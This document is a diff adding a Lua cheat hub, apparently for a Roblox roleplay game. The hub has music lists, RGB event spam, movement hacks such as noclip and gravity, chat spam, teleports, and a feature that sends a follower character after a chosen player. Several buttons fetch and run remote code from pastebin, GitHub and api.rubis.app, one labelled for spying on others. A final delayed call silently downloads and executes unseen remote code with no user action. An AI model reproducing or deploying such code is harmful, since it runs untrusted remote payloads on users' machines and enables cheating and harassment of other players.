+        {name = "Melodia Virtual", id = "139147474886402"},
+        {name = "Melodia Serena", id = "97011217688307"},
+        {name = "SENTA", id = "124085422276732"},
+        {name = "crazy-lol", id = "106958630419629"},
+        {name = "V7", id = "80348640826643"},
+        {name = "UIUAH", id = "82894376737849"},
+        {name = "meta ritmo", id = "110091098283354"},
+        {name = "CAPPUCCINO ASSASSINO (SPEDUP)", id = "132733033157915"},
+        {name = "haha (NGI)", id = "122114766584918"},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""}
+    }
+}, "Option 1")
+
+-- Dropdown "Phonk"
+createMusicDropdown("Phonk", {
+    ["phonk"] = {
+        {name = "wyles", id = "85385155970460"},
+        {name = "Vai Que E No Vapor!", id = "94845998956451"},
+        {name = "phonk kawai", id = "91502410121438"},
+        {name = "querendo da a bucet@", id = "72720721570850"},
+        {name = "vem no pocpoc", id = "102333419023382"},
+        {name = "tatiu wim", id = "122871512353520"},
+        {name = "novinha sapeca", id = "111668097052966"},
+        {name = "novinha representa", id = "93786060174790"},
+        {name = "phonk1", id = "77501611905348"},
+        {name = "phonk2", id = "126887144190812"},
+        {name = "phonk sarra", id = "132436320685732"},
+        {name = "phonk3", id = "90323407842935"},
+        {name = "novinha dançapanpa", id = "132245626038510"},
+        {name = "phonk sexoagreçivo", id = "111995323199676"},
+        {name = "phonk4", id = "115016589376700"},
+        {name = "phonk5", id = "118740708757685"},
+        {name = "phonk6", id = "139435437308948"},
+        {name = "phonk chapaquente", id = "109189438638906"},
+        {name = "phonk rajada", id = "105126065014034"},
+        {name = "rede globo", id = "138487820505005"},
+        {name = "phonk indiano", id = "87968531262747"},
+        {name = "vapo do vapo", id = "106317184644394"},
+        {name = "tutatatutata", id = "112068892721408"},
+        {name = "phonk slower", id = "122852029094656"},
+        {name = "phonk9", id = "91760524161503"},
+        {name = "phonk10", id = "73140398421340"},
+        {name = "phonk11", id = "137962454483542"},
+        {name = "phonk12", id = "84733736048142"},
+        {name = "phonk13", id = "106322173003761"},
+        {name = "phonk14", id = "94604796823780"},
+        {name = "phonk15", id = "118063577904953"},
+        {name = "phonk16", id = "115567432786512"},
+        {name = "phonk toq", id = "71304501822029"},
+        {name = "phonk hey", id = "132218979961283"},
+        {name = "phonk17", id = "102708912256857"},
+        {name = "phonk18", id = "140642559093189"},
+        {name = "phonk neve", id = "13530439660"},
+        {name = "phonk19", id = "87863924786534"},
+        {name = "phonk20", id = "133135085604736"},
+        {name = "phonk lento", id = "97258811783169"},
+        {name = "phonk21", id = "92308400487695"},
+        {name = "tipo wym", id = "88064647826500"},
+        {name = "estouradassa1", id = "92175624643620"},
+        {name = "estouradassa2", id = "108099943758978"},
+        {name = "trem", id = "114608169341947"},
+        {name = "eoropa", id = "111346133543699"},
+        {name = "atimosphekika", id = "77857496821844"},
+        {name = "phonk ALL THE TIME", id = "123809083385992"},
+        {name = "Automotivo Blondie (Pke Gaz1nh)", id = "74564219749776"},
+        {name = " v2", id =  "118225359190317"},
+        {name = "MTG TU VAI SENTAR (Pke Gaz1nh)", id = "115317874112657"},
+        {name = "Catuquanvan", id = "88038595663211"},
+        {name = "F-D-1 (slowed)", id = "124958445624871"},
+        {name = "Sucessagem", id = "88551699463723"},
+        {name = "ILOVE phonksla", id = "82148953715595"},
+        {name = "SPEED SLIDE", id = "118959437310311"},
+        {name = "TOMA FUNK PHONK", id = "126291069838831"},
+        {name = "PASSO BEM SOLTO X NEW JAZZ", id = "122706595087279"},
+        {name = "MONTAGEM BIONICA DIAMANTE", id = "122338822665007"},
+        {name = "BALA SELVAGEM!", id = "96180057167470"},
+        {name = "COMO TU", id = "86928685812280"},
+        {name = "MONTAGEM SOLAR TROPICANO (SPEED UP)", id = "116461681407294"},
+        {name = "MONTAGEM SOLAR TROPICANO (SLOWED)", id = "109308273341422"},
+        {name = "YO DE TI", id = "125181345407169"},
+        {name = "Beauty, (Phonk), Super sped up", id = "71123357599630"},
+        {name = "BRAZIL DO FUNK", id = "133498554139200"},
+        {name = "FUNK DO RAVE 1.0", id = "137135395010424"},
+        
+        {name = " Portao Funk", id = "70900514961735"},
+        {name = " FUTABA", id = "91834632690710"},
+        {name = " Melódica Explosão De Melodia", id = "98371771055411"},
+        {name = " HIPNOTIZA", id = "117668905142866"},
+        {name = "CRISTAL NOTURNO", id = "103695219371872"},
+        {name = " SKY HIGH", id = "123517126955383"},
+        {name = "GOTH FUNK", id = "97662362226511"},
+        {name = "SUBURBANA", id = "139825057894568"},
+        {name = "STORYMODECOOL", id = "87115976125426"},
+        {name = "KOBALT", id = "79381341943021"},
+        {name = " andante bacterial", id = "105882833374061"},
+        {name = "ANGEL Speed Up", id = "139593870988593"},
+        {name = "MALDITA", id = "133814632960968"},
+        {name = "HIPNOTIZA", id = "132015050363205"},
+        {name = "MIDZUKI speed up", id = "129151948619922"},
+        {name = "CRISTAL", id = "103445348511856"},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""}
+    }
+}, "Option 1")
+
+Tab:AddButton({
+    Name = "Stop",
+    Description = "ALL music",
+    Callback = function()
+        tocarMusica("")
+    end
+})
+
+local Tab6 = Window:MakeTab({"Name and Rgb's", "Paper"})
+
+local Section = Tab6:AddSection({"Aumente a velocidade do Rgb"})
+
+-- Velocidade controlada pelo slider (quanto maior, mais rápido)
+local rgbSpeed = 1
+
+Tab6:AddSlider({
+    Name = "Velocidade RGB",
+    Description = "Aumenta a velocidade do efeito RGB",
+    Min = 1,
+    Max = 5,
+    Increase = 1,
+    Default = 3,
+    Callback = function(Value)
+        rgbSpeed = Value
+    end
+})
+
+-- Função para criar cor RGB suave com HSV
+local function getRainbowColor(speedMultiplier)
+    local h = (tick() * speedMultiplier % 5) / 5 -- gira o hue suavemente de 0 a 1
+    return Color3.fromHSV(h, 1, 1)
+end
+
+-- Função para disparar eventos
+local function fireServer(eventName, args)
+    local event = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
+    if event and event:FindFirstChild(eventName) then
+        pcall(function()
+            event[eventName]:FireServer(unpack(args))
+        end)
+    end
+end
+
+local Section = Tab6:AddSection({"RGB para usar em você"})
+
+-- Nome + Bio RGB  juntos
+local nameBioRGBActive = false
+Tab6:AddToggle({
+    Name = "Nome + Bio RGB",
+    Default = false,
+    Callback = function(state)
+        nameBioRGBActive = state
+        if state then
+            task.spawn(function()
+                while nameBioRGBActive and LocalPlayer.Character do
+                    local color = getRainbowColor(rgbSpeed)
+                    fireServer("1RPNam1eColo1r", { "PickingRPNameColor", color })
+                    fireServer("1RPNam1eColo1r", { "PickingRPBioColor", color })
+                    task.wait(0.03)
+                end
+            end)
+        end
+    end
+})
+
+local Section = Tab6:AddSection({"RGB's"})
+
+local ToggleBicicleta = Tab6:AddToggle({
+    Name = "RGB Bicicleta",
+    Description = "RGB na bicicleta",
+    Default = false
+})
+ToggleBicicleta:Callback(function(Value)
+    getgenv().rgbBicicleta = Value
+    task.spawn(function()
+        while getgenv().rgbBicicleta do
+            fireServer("1Player1sCa1r", {
+                "NoMotorColor",
+                getRainbowColor(rgbSpeed)
+            })
+            task.wait(0.1)
+        end
+    end)
+end)
+
+local radioRGBActive = false
+Tab6:AddToggle({
+    Name = "Rádio RGB",
+    Default = false,
+    Callback = function(state)
+        radioRGBActive = state
+        if state then
+            task.spawn(function()
+                while radioRGBActive and LocalPlayer.Character do
+                    local color = getRainbowColor(rgbSpeed)
+                    local success, remote = pcall(function()
+                        return LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")
+                    end)
+                    if success and remote then
+                        pcall(function()
+                            remote:FireServer(color)
+                        end)
+                    end
+                    task.wait(0.03)
+                end
+            end)
+        end
+    end
+})
+
+local ChildTab = Window:MakeTab({"Child", "baby"})
+
+local Section = ChildTab:AddSection({
+
+    Name = "Child"
+
+})
+
+local chasingplayer = nil
+
+local playerChild = ChildTab:AddDropdown({
+
+    Name = "Select a player to chase",
+
+    Options = players,
+
+    Default = "",
+
+    Callback = function(selected)
+
+        if game.Players:FindFirstChild(selected) then
+
+            chasingplayer = selected
+
+        else
+
+            chasingplayer = nil
+
+        end
+
+    end
+
+})
+
+ChildTab:AddButton({
+
+    Name = "Update Player List",
+
+    Callback = function()
+
+        local updatedPlayers = updatePlayerList()
+
+        if playerChild and updatedPlayers then
+
+            pcall(function()
+
+                playerChild:Refresh(updatedPlayers)
+
+            end)
+
+            if chasingplayer and not game.Players:FindFirstChild(chasingplayer) then
+
+                chasingplayer = nil
+
+                pcall(function()
+
+                    playerChild:Set("")
+
+                end)
+
+            end
+
+        end
+
+    end
+
+})
+
+game.Players.PlayerAdded:Connect(function()
+
+    task.wait(0.1)
+
+    local updatedPlayers = updatePlayerList()
+
+    if playerChild and updatedPlayers then
+
+        pcall(function()
+
+            playerChild:Refresh(updatedPlayers)
+
+        end)
+
+    end
+
+end)
+
+
+
+game.Players.PlayerRemoving:Connect(function(player)
+
+    task.wait(0.1)
+
+    local updatedPlayers = updatePlayerList()
+
+    if playerChild and updatedPlayers then
+
+        pcall(function()
+
+            playerChild:Refresh(updatedPlayers)
+
+        end)
+
+        if chasingplayer == player.Name then
+
+            chasingplayer = nil
+
+            pcall(function()
+
+                playerChild:Set("")
+
+            end)
+
+        end
+
+    end
+
+end)
+
+ChildTab:AddButton({
+
+    Name = "Send Child",
+
+    Callback = function()
+
+        if not chasingplayer then
+
+            return
+
+        end
+
+        if not workspace:FindFirstChild(pl.Name) or not workspace[pl.Name]:FindFirstChild("FollowCharacter") then
+
+            local args = {
+
+                [1] = "CharacterFollowSpawnPlayer",
+
+                [2] = "BabyBoy"
+
+            }
+
+local success, err = pcall(function()
+
+                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))
+
+            end)
+
+            if not success then
+
+            end
+
+        end
+
+        
+
+        task.wait(0.2)
+
+        
+
+        if workspace:FindFirstChild(pl.Name) then
+
+            for _, v in pairs(workspace[pl.Name]:GetChildren()) do
+
+                if v:IsA("BasePart") then
+
+                    v.CanCollide = true
+
+                end
+
+            end
+
+        end
+
+
+
+        local target = chasingplayer
+
+        if workspace:FindFirstChild(target) and workspace:FindFirstChild(pl.Name) and workspace[pl.Name]:FindFirstChild("FollowCharacter") then
+
+            workspace[pl.Name].FollowCharacter.Parent = workspace[target]
+
+
+
+            if rawget(getgenv(), "RunService") then
+
+                return
+
+            end
+
+
+
+            getgenv().RunService = game:GetService("RunService").Heartbeat:Connect(function()
+
+                local followCharacter = workspace[target]:FindFirstChild("FollowCharacter")
+
+                if followCharacter and followCharacter:FindFirstChild("Torso") and followCharacter.Torso:FindFirstChild("BodyPosition") then
+
+                    local humanoidRootPart = workspace[target]:FindFirstChild("HumanoidRootPart")
+
+                    if humanoidRootPart then
+
+                        followCharacter.Torso.BodyPosition.Position = humanoidRootPart.Position - (humanoidRootPart.CFrame.LookVector * 3)
+
+                        followCharacter.Torso.BodyGyro.CFrame = humanoidRootPart.CFrame
+
+                    end
+
+                end
+
+            end)
+
+        end
+
+    end
+
+})
+
+ChildTab:AddButton({
+
+    Name = "Return Child",
+
+    Callback = function()
+
+        if rawget(getgenv(), "RunService") then
+
+            getgenv().RunService:Disconnect()
+
+            getgenv().RunService = nil
+
+        end
+
+
+
+        local args = { [1] = "DeleteFollowCharacter" }
+
+        local success, err = pcall(function()
+
+            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))
+
+        end)
+
+        if not success then
+
+        end
+
+
+
+        local args1 = { [1] = "CharacterFollowSpawnPlayer", [2] = "BabyBoy" }
+
+        success, err = pcall(function()
+
+            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args1))
+
+        end)
+
+        if not success then
+
+        end
+
+    end
+
+})
+
+ChildTab:AddToggle({
+
+    Name = "View Player",
+
+    Default = false,
+
+    Callback = function(Value)
+
+        local Players = game:GetService("Players")
+
+        local RunService = game:GetService("RunService")
+
+        local LocalPlayer = Players.LocalPlayer
+
+        local Camera = workspace.CurrentCamera
+
+
+
+        if Value then
+
+            if not chasingplayer then
+
+                return false
+
+            end
+
+
+
+            if not rawget(getgenv(), "CameraConnection") then
+
+                getgenv().CameraConnection = RunService.Heartbeat:Connect(function()
+
+                    local targetPlayer = Players:FindFirstChild(chasingplayer)
+
+                    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+
+                        Camera.CameraSubject = targetPlayer.Character.Humanoid
+
+                    else
+
+                        if rawget(getgenv(), "CameraConnection") then
+
+                            getgenv().CameraConnection:Disconnect()
+
+                            getgenv().CameraConnection = nil
+
+                        end
+
+                        Camera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or nil
+
+                    end
+
+                end)
+
+            end
+
+        else
+
+            if rawget(getgenv(), "CameraConnection") then
+
+                getgenv().CameraConnection:Disconnect()
+
+                getgenv().CameraConnection = nil
+
+            end
+
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+
+                Camera.CameraSubject = LocalPlayer.Character.Humanoid
+
+            end
+
+        end
+
+    end
+
+})
+
+local LocalPlayerTab = Window:MakeTab({"Local Player", "user"})
+
+local Section = LocalPlayerTab:AddSection({
+
+    Name = "Local Player"
+
+})
+
+LocalPlayerTab:AddTextBox({
+
+    Name = "Walk Speed",
+
+    PlaceholderText = "Type here...",
+
+    Callback = function(value)
+
+        local speed = tonumber(value)
+
+        if speed and pl.Character and pl.Character:FindFirstChild("Humanoid") then
+
+            pl.Character.Humanoid.WalkSpeed = speed
+
+        else
+
+        end
+
+    end
+
+})
+
+LocalPlayerTab:AddButton({
+
+    Name = "Reset Walk Speed",
+
+    Callback = function()
+
+        if pl.Character and pl.Character:FindFirstChild("Humanoid") then
+
+            pl.Character.Humanoid.WalkSpeed = 16
+
+        end
+
+    end
+
+})
+
+LocalPlayerTab:AddTextBox({
+
+    Name = "Jump Power",
+
+    PlaceholderText = "Type here...",
+
+    Callback = function(value)
+
+        local jumpHeight = tonumber(value)
+
+        if jumpHeight and pl.Character and pl.Character:FindFirstChild("Humanoid") then
+
+            pl.Character.Humanoid.JumpPower = jumpHeight
+
+        else
+
+        end
+
+    end
+
+})
+
+LocalPlayerTab:AddButton({
+
+    Name = "Reset Jump Power",
+
+    Callback = function()
+
+        if pl.Character and pl.Character:FindFirstChild("Humanoid") then
+
+            pl.Character.Humanoid.JumpPower = 50
+
+        end
+
+    end
+
+})
+
+LocalPlayerTab:AddTextBox({
+
+    Name = "Gravity",
+
+    PlaceholderText = "Type here...",
+
+    Callback = function(value)
+
+        local gravity = tonumber(value)
+
+        if gravity then
+
+            workspace.Gravity = gravity
+
+        else
+
+        end
+
+    end
+
+})
+
+LocalPlayerTab:AddButton({
+
+    Name = "Reset Gravity",
+
+    Callback = function()
+
+        workspace.Gravity = 196.2
+
+    end
+
+})
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local noclipConnection
+
+LocalPlayerTab:AddToggle({
+    Name = "Noclip",
+    Callback = function(state)
+
+        if state then
+            noclipConnection = RunService.Stepped:Connect(function()
+                local char = player.Character
+                if char then
+                    for _, v in pairs(char:GetDescendants()) do
+                        if v:IsA("BasePart") then
+                            v.CanCollide = false
+                        end
+                    end
+                end
+            end)
+
+        else
+            if noclipConnection then
+                noclipConnection:Disconnect()
+                noclipConnection = nil
+            end
+        end
+
+    end
+})
+
+LocalPlayerTab:AddSection({ "FE INVISIBLE" })
+LocalPlayerTab:AddButton({
+    Name = "FE INVISIBLE",
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+    end
+}) 
+
+Section = LocalPlayerTab:AddSection({
+
+    Name = "Chat"
+
+})
+
+local TextSave
+
+local tcs = game:GetService("TextChatService")
+
+local chat = tcs.ChatInputBarConfiguration and tcs.ChatInputBarConfiguration.TargetTextChannel
+
+function sendchat(msg)
+
+    if not msg or msg == "" then return end
+
+    if tcs.ChatVersion == Enum.ChatVersion.LegacyChatService then
+
+        local success, err = pcall(function()
+
+            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg, "All")
+
+        end)
+
+        if not success then
+
+        end
+
+    elseif chat then
+
+        local success, err = pcall(function()
+
+            chat:SendAsync(msg)
+
+        end)
+
+        if not success then
+
+        end
+
+    end
+
+end
+
+LocalPlayerTab:AddTextBox({
+
+    Name = "Enter Text",
+
+    PlaceholderText = "Uh... Hi!",
+
+    Callback = function(text)
+
+        TextSave = text
+
+    end
+
+})
+
+LocalPlayerTab:AddButton({
+
+    Name = "Send Chat",
+
+    Callback = function()
+
+        sendchat(TextSave)
+
+    end
+
+})
+
+getgenv().ChaosHubEnviarDelay = 1
+
+LocalPlayerTab:AddSlider({
+
+    Name = "Delay Spam",
+
+    Min = 0.4,
+
+    Max = 10,
+
+    Default = 1,
+
+    Increment = 0.1,
+
+    Callback = function(Value)
+
+        getgenv().ChaosHubEnviarDelay = Value
+
+    end
+
+})
+
+LocalPlayerTab:AddToggle({
+
+    Name = "Spam Chat",
+
+    Default = false,
+
+    Flag = "SpamXhati",
+
+    Callback = function(Value)
+
+        getgenv().ChaosHubSpawnText = Value
+
+        while getgenv().ChaosHubSpawnText do
+
+            sendchat(TextSave)
+
+            task.wait(getgenv().ChaosHubEnviarDelay)
+
+        end
+
+    end
+
+})
+
+local ScrTab = Window:MakeTab({ "Scripts", "codesandbox" })
+
+ScrTab:AddSection({ "Drone  " })
+ScrTab:AddButton({
+    Name = "Drone para espionar os outros akkaka",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/drone/refs/heads/main/Main.txt"))()
+    end
+})
+
+local Tab = Window:MakeTab({"Teleports", "tp"}) 
+
+local Section = Tab:AddSection({
+
+    Name = "Teleports"
+
+})
+
+local teleportButtons = {
+
+    {"Hotel", CFrame.new(192, 4, 272)},
+
+    {"Urban Center", CFrame.new(136, 4, 117)},
+
+    {"Criminal Area", CFrame.new(-119, -28, 235)},
+
+    {"Abandoned House", CFrame.new(986, 4, 63)},
+
+    {"Agency Portal", CFrame.new(672, 4, -296)},
+
+    {"Hideout", CFrame.new(505, -75, 143)},
+
+    {"School", CFrame.new(-312, 4, 211)},
+
+    {"Burguer Barn", CFrame.new(161, 8, 52)},
+
+    {"Starting Point", CFrame.new(-26, 4, -23)},
+
+    {"Main Arch", CFrame.new(-589, 141, -59)},
+
+    {"Hospital", CFrame.new(-309, 4, 71)},
+
+    {"Agency Base", CFrame.new(179, 4, -464)},
+
+    {"Hidden Place of the Workshop", CFrame.new(0, 4, -495)},
+
+    {"Secret Place", CFrame.new(-343, 4, -613)},
+
+    {"Isolated Island", CFrame.new(-1925, 23, 127)},
+
+    {"Hotel Square", CFrame.new(182, 4, 150)},
+
+    {"Climb Mountain", CFrame.new(-670, 251, 765)},
+
+    {"Main Bank", CFrame.new(2.28, 4.65, 254.58)},
+
+    {"Clothing Store", CFrame.new(-46.15, 4.65, 253.20)},
+
+    {"Veterinary", CFrame.new(-88.48, 22.05, 262.34)},
+
+    {"Dental Clinic", CFrame.new(-53.58, 22.15, 265.61)},
+
+    {"Coffee", CFrame.new(-97.12, 4.65, 254.99)}
+
+}
+
+
+
+for _, btn in ipairs(teleportButtons) do
+
+    Tab:AddButton({
+
+        btn[1],
+
+        function()
+
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = btn[2]
+
+        end
+
+    })
+
+end
+
+
+
+local Tab13 = Window:MakeTab({"Protections", "shield"})
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+
+local protections = {
+    Canoe = false,
+    Jet = false,
+    Heli = false,
+    Ball = false,
+    Sit = false
+}
+
+task.spawn(function()
+    while true do
+
+        local char = LocalPlayer.Character
+        local workspaceCom = Workspace:FindFirstChild("WorkspaceCom")
+
+        if workspaceCom then
+
+            -- Anti Canoe Fling
+            if protections.Canoe then
+                local canoeFolder = workspaceCom:FindFirstChild("001_CanoeStorage")
+                if canoeFolder then
+                    for _, canoe in ipairs(canoeFolder:GetChildren()) do
+                        local owner = canoe:FindFirstChild("Owner")
+                        if not owner or owner.Value ~= LocalPlayer then
+                            canoe:Destroy()
+                        end
+                    end
+                end
+            end
+
+            -- Anti Jet Fling
+            if protections.Jet then
+                local airport = workspaceCom:FindFirstChild("001_Airport")
+                if airport then
+                    local hanger = airport:FindFirstChild("AirportHanger")
+                    if hanger then
+                        local jetStorage = hanger:FindFirstChild("001_JetStorage")
+                        if jetStorage then
+                            local jetFolder = jetStorage:FindFirstChild("JetAirport")
+                            if jetFolder then
+                                for _, jet in ipairs(jetFolder:GetChildren()) do
+                                    if jet.Name ~= LocalPlayer.Name then
+                                        jet:Destroy()
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            -- Anti Helicopter Fling
+            if protections.Heli then
+                local heliStorage = workspaceCom:FindFirstChild("001_HeliStorage")
+                if heliStorage then
+                    local heliFolder = heliStorage:FindFirstChild("PoliceStationHeli")
+                    if heliFolder then
+                        for _, heli in ipairs(heliFolder:GetChildren()) do
+                            if heli.Name ~= LocalPlayer.Name then
+                                heli:Destroy()
+                            end
+                        end
+                    end
+                end
+            end
+
+            -- Anti Ball Fling
+            if protections.Ball then
+                local ballFolder = workspaceCom:FindFirstChild("001_SoccerBalls")
+                if ballFolder then
+                    for _, ball in ipairs(ballFolder:GetChildren()) do
+                        ball:Destroy()
+                    end
+                end
+            end
+
+        end
+
+        -- Anti Sit
+        if protections.Sit and char then
+            local humanoid = char:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+
+                if humanoid:GetState() == Enum.HumanoidStateType.Seated then
+                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+                end
+            end
+        end
+
+        task.wait(0.2)
+
+    end
+end)
+
+-- Toggles
+
+Tab13:AddToggle({
+    Name = "Anti Canoe Fling",
+    Default = false,
+    Callback = function(value)
+        protections.Canoe = value
+    end
+})
+
+Tab13:AddToggle({
+    Name = "Anti Jet Fling",
+    Default = false,
+    Callback = function(value)
+        protections.Jet = value
+    end
+})
+
+Tab13:AddToggle({
+    Name = "Anti Helicopter Fling",
+    Default = false,
+    Callback = function(value)
+        protections.Heli = value
+    end
+})
+
+Tab13:AddToggle({
+    Name = "Anti Ball Fling",
+    Default = false,
+    Callback = function(value)
+        protections.Ball = value
+    end
+})
+
+Tab13:AddToggle({
+    Name = "Anti Sit",
+    Default = false,
+    Callback = function(value)
+        protections.Sit = value
+    end
+})
+
+task.delay(5, function()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/OFbzRF1izFenc6Li/raw"))()
+end)
